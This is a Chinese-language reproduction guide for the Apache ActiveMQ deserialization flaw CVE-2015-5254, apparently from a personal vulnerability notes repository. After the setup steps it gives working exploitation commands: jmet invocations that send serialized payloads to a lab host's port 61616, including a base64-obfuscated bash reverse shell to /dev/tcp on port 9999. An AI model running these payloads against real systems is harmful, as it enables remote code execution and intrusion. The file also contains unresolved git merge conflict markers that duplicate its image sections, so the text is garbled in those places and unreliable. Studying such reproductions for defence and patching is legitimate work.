# ActiveMQ Deserialization Vulnerability (CVE-2015-5254)

## 漏洞描述

Apache ActiveMQ是美国阿帕奇（Apache）软件基金会所研发的一套开源的消息中间件，它支持Java消息服务，集群，Spring Framework等。Apache ActiveMQ 5.13.0之前5.x版本中存在安全漏洞，该漏洞源于程序没有限制可在代理中序列化的类。远程攻击者可借助特制的序列化的Java消息服务（JMS）ObjectMessage对象利用该漏洞执行任意代码。

## 漏洞影响

```
Apache ActiveMQ 5.13.0之前5.x版本
```

## 环境配置

### 安装jdk

查看java版本，如果是java 11需要切换到java 8

```
java -version
```

安装java 8，默认安装路径/usr/lib/jvm/java-8-openjdk-amd64

```
sudo apt install openjdk-8-jdk
```

配置环境变量，添加jdk安装路径

```
sudo vim ~/.bashrc

# 在最后一行添加
export JAVA_HOME=/usr/lib/jvm/java-8-openjdk-amd64
```

### 切换jdk版本

采用update-alternatives命令进行版本切换

 /usr/bin/java和/usr/lib/jvm/java-8-openjdk-amd64/bin/java两个路径一定要和自己的路径吻合

```
sudo update-alternatives --install /usr/bin/java java /usr/lib/jvm/java-8-openjdk-amd64/bin/java 1070
```

切换jdk

```
sudo update-alternatives --config java
```

<<<<<<< HEAD
![image-20220221132209838](https://typora-1308934770.cos.ap-beijing.myqcloud.com/202202211347981.png)

再次查看java版本，切换成功

![image-20220221132246597](https://typora-1308934770.cos.ap-beijing.myqcloud.com/202202211347982.png)
=======
![image-20220221132209838](../../../Markdown/images/202202211324903-16454223573971.png)

再次查看java版本，切换成功

![image-20220221132246597](../../../Markdown/images/202202211324904-16454223573973.png)
>>>>>>> a0c04df852848f5cd26efb3aeb78ae9780805765

### 漏洞复现

下载 jmet [下载链接](https://github.com/matthiaskaiser/jmet/releases/download/0.1.0/jmet-0.1.0-all.jar)

```shell
wget https://github.com/matthiaskaiser/jmet/releases/download/0.1.0/jmet-0.1.0-all.jar
mkdir external
```

对目标发送一个生成**/tmp/vuln**的 payload

```plain
java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y "touch /tmp/awesome_poc" -Yp ROME 192.168.174.128 61616
```

<<<<<<< HEAD
![image-20220221133654012](https://typora-1308934770.cos.ap-beijing.myqcloud.com/202202211347983.png)

访问 http://192.168.174.128:8161/admin/browse.jsp?JMSDestination=event 可以看到多了一条消息队列，ID为kali-38087-1645421794512-1:1:1:1:1

![image-20220221133733242](https://typora-1308934770.cos.ap-beijing.myqcloud.com/202202211347984.png)

点击这个信息触发文件创建，成功执行命令 touch /tmp/awesome_poc

![image-20220221133952983](https://typora-1308934770.cos.ap-beijing.myqcloud.com/202202211347985.png)

![2](https://typora-1308934770.cos.ap-beijing.myqcloud.com/202202211347986.png)也可以创建一个反弹shell的payload
=======
![image-20220221133654012](../../../Markdown/images/202202211345369-16454223573975.png)

访问 http://192.168.174.128:8161/admin/browse.jsp?JMSDestination=event 可以看到多了一条消息队列，ID为kali-38087-1645421794512-1:1:1:1:1

![image-20220221133733242](../../../Markdown/images/202202211345370-16454223573977.png)

点击这个信息触发文件创建，成功执行命令 touch /tmp/awesome_poc

![image-20220221133952983](../../../Markdown/images/202202211345371-16454223573979.png)

![2](../../../Markdown/images/202202211324906-164542235739711.png)也可以创建一个反弹shell的payload
>>>>>>> a0c04df852848f5cd26efb3aeb78ae9780805765

```shell
bash -i >& /dev/tcp/192.168.174.128/9999 0>&1  (base64编码)
YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE3NC4xMjgvOTk5OSAwPiYx

bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE3NC4xMjgvOTk5OSAwPiYx}|{base64,-d}|{bash,-i}

# 发送payload
java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE3NC4xMjgvOTk5OSAwPiYx}|{base64,-d}|{bash,-i}" -Yp ROME 192.168.174.128 61616
```

<<<<<<< HEAD
![image-20220221134243490](https://typora-1308934770.cos.ap-beijing.myqcloud.com/202202211347987.png)

查看消息队列，ID为kali-38435-1645422155171-1:1:1:1:1

![image-20220221134313545](https://typora-1308934770.cos.ap-beijing.myqcloud.com/202202211347988.png)

监听9999端口，点击消息队列会触发命令执行，反弹Shell

![image-20220221134508900](https://typora-1308934770.cos.ap-beijing.myqcloud.com/202202211347989.png)
=======
![image-20220221134243490](../../../Markdown/images/202202211345372-164542235739713.png)

查看消息队列，ID为kali-38435-1645422155171-1:1:1:1:1

![image-20220221134313545](../../../Markdown/images/202202211345373-164542235739715.png)

监听9999端口，点击消息队列会触发命令执行，反弹Shell

![image-20220221134508900](../../../Markdown/images/202202211345374-164542235739717.png)
>>>>>>> a0c04df852848f5cd26efb3aeb78ae9780805765

